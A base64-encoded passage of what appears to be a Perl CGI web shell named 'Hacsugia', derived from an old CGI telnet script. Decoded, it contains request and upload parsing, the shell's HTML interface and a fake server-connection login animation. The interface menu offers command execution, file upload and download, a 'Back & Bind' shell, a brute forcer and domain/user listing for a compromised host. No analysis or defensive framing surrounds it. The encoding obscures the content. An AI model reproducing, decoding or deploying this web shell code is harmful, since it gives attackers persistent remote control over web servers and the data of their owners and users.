ZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJbXkgJGRpciA9JEN1cnJlbnREaXI7DQoJJGRpcj1+IHMvXFwvXFxcXC9nOw0KCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOw0KCXByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+DQoNCiRIdG1sTWV0YUhlYWRlcg0KDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KdHIgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCnRkIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICMyQkE4RUM7DQpmb250OiAxMHB0IFZlcmRhbmE7DQp9DQoNCnRhYmxlIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzExMTsNCn0NCg0KDQppbnB1dCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZjk5MDA7DQp9DQoNCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCg0KY29kZSB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hIGJvbGQ7DQpjb2xvcjogd2hpbGU7DQp9DQoNCnJ1biB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6ICNGRjAwQUE7DQp9DQoNCnRleHRhcmVhIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzFiMWIxYjsNCmZvbnQ6IEZpeGVkc3lzIGJvbGQ7DQpjb2xvcjogI2FhYTsNCn0NCkE6bGluayB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTp2aXNpdGVkIHsNCglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNmZjk5MDA7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTphY3RpdmUgew0KCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KDQoubGlzdGRpciB0cjpob3ZlcnsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KfQ0KLmxpc3RkaXIgdHI6aG92ZXIgdGR7DQoJYmFja2dyb3VuZDogIzQ0NDsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNGRkZGRkY7IFRFWFQtREVDT1JBVElPTjogbm9uZTsNCn0NCi5ub3RsaW5lew0KCWJhY2tncm91bmQ6ICMxMTE7DQp9DQoubGluZXsNCgliYWNrZ3JvdW5kOiAjMjIyOw0KfQ0KPC9zdHlsZT4NCjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPg0KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpDQp7DQoJLyp2YXIgYWpheD0nYWpheF9Qb3N0RGF0YSgiRm9ybVBlcm1zXycraSsnIiwiJFNjcmlwdExvY2F0aW9uIiwiUmVzcG9uc2VEYXRhIik7IHJldHVybiBmYWxzZTsnOyovDQoJdmFyIGFqYXg9IiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVQZXJtc18iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpDQp7DQoJcmVzcG9uc2UuaW5uZXJIVE1MID0gIjxzcGFuIG9uY2xpY2s9XFxcImNobW9kX2Zvcm0oIiArIGkgKyAiLCciKyBmaWxlKyAiJylcXFwiID4iKyBwZXJtcyArIjwvc3Bhbj48L3RkPiI7DQp9DQpmdW5jdGlvbiByZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCgl2YXIgYWpheD0iIjsNCglmLnJlcGxhY2UoL1xcXFwvZywiXFxcXFxcXFwiKTsNCgl2YXIgYmFjaz0icm1fcmVuYW1lX2Zvcm0oIitpKyIsXFxcIiIrZmlsZSsiXFxcIixcXFwiIitmKyJcXFwiKTsgcmV0dXJuIGZhbHNlOyI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGJhY2sgKyAiJyB2YWx1ZT1DYW5jZWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCglpZihmPT0nZicpDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mj4NCgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4NCgk8L3RkPg0KDQoJPHRkPg0KDQoJCTxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPiRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9PC9mb250Pg0KCTwvdGQ+DQoJPHRkPlNlcnZlciBJUDo8Zm9udCBjb2xvcj0iI2JiMDAwMCI+ICRFTlZ7J1NFUlZFUl9BRERSJ308L2ZvbnQ+IHwgWW91ciBJUDogPGZvbnQgY29sb3I9IiNiYjAwMDAiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+DQoJPC90ZD4NCg0KPC90cj4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjMiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uIj5Ib21lPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5HVUk8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YmFja2JpbmQiPkJhY2sgJiBCaW5kPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jaGVja2xvZyI+Q2hlY2sgTG9nPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb21haW5zdXNlciI+RG9tYWlucy9Vc2VyczwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwNCjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSIjIj5IZWxwPC9hPg0KDQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KDQoJcHJpbnQgPDxFTkQ7DQo8cHJlPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7DQogIGlmKCh0eXBlb2YgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQgPT0gInVuZGVmaW5lZCIpIHx8ICh0eXBlb2YgZWxlbWVudC5pbm5lckhUTUwgPT0gInVuZGVmaW5lZCIpKSB7DQogICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsJLy8gTmV2ZXIgcnVuLg0KICAgIHJldHVybjsNCiAgfQ0KICB0aGlzLmVsZW1lbnQgPSBlbGVtZW50Ow0KICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsNCiAgdGhpcy5pbnRlcnZhbCA9ICh0eXBlb2YgaW50ZXJ2YWwgPT0gInVuZGVmaW5lZCIgPyAxMDAgOiBpbnRlcnZhbCk7DQogIHRoaXMub3JpZ1RleHQgPSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MOw0KICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0Ow0KICB0aGlzLmN1cnNvciA9IChjdXJzb3IgPyBjdXJzb3IgOiAiIik7DQogIHRoaXMuY3VycmVudFRleHQgPSAiIjsNCiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogIHRoaXMuZWxlbWVudC50eXBpbmdUZXh0ID0gdGhpczsNCiAgaWYodGhpcy5lbGVtZW50LmlkID09ICIiKSB0aGlzLmVsZW1lbnQuaWQgPSAidHlwaW5ndGV4dCIgKyBUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCsrOw0KICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOw0KICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICB0aGlzLnRhZ0J1ZmZlciA9ICIiOw0KICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiIjsNCn0NClR5cGluZ1RleHQuYWxsID0gbmV3IEFycmF5KCk7DQpUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCA9IDA7DQpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgew0KICBmb3IodmFyIGkgPSAwOyBpIDwgVHlwaW5nVGV4dC5hbGwubGVuZ3RoOyBpKyspIFR5cGluZ1RleHQuYWxsW2ldLnJ1bigpOw0KfQ0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7DQogIGlmKHRoaXMucnVubmluZykgcmV0dXJuOw0KICBpZih0eXBlb2YgdGhpcy5vcmlnVGV4dCA9PSAidW5kZWZpbmVkIikgew0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuDQogICAgcmV0dXJuOw0KICB9DQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsNCi8vICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dC5yZXBsYWNlKC88KFtePF0pKj4vLCAiIik7ICAgICAvLyBTdHJpcCBIVE1MIGZyb20gdGV4dC4NCiAgaWYodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoKSB7DQogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciA9ICI8IjsNCiAgICAgIHRoaXMuaW5UYWcgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9ICI+IjsNCiAgICAgIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICImIjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9ICI7IjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSB7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgIH0NCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsNCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MICs9ICh0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGggLSAxID8gKHR5cGVvZiB0aGlzLmN1cnNvciA9PSAiZnVuY3Rpb24iID8gdGhpcy5jdXJzb3IodGhpcy5jdXJyZW50VGV4dCkgOiB0aGlzLmN1cnNvcikgOiAiIik7DQogICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsNCiAgfSBlbHNlIHsNCgl0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQoJdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogICAgICAgIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICAgICAgICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2soKTsNCiAgfQ0KfQ0KPC9zY3JpcHQ+DQo8L3ByZT4NCg0KPGZvbnQgc3R5bGU9ImZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsiPkNvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhIDwvZm9udD48YnI+PGJyPg0KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+DQo8dGJvZHk+PHRyPg0KPHRkIHZhbGlnbj0idG9wIiBiYWNrZ3JvdW5kPSJodHRwOi8vZGwuZHJvcGJveC5jb20vdS8xMDg2MDA1MS9pbWFnZXMvbWF0cmFuLmdpZiI+PHAgaWQ9ImhhY2siIHN0eWxlPSJtYXJnaW4tbGVmdDogM3B4OyI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4NCg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPiBUcnlpbmcgY29ubmVjdCB0byBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PiBDaGVja2luZyBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD4gPGJyPg0KDQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPg0KDQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD5cJCBDb25uZWN0ZWQgQ29tbWFuZCEgPC9mb250Pjxicj4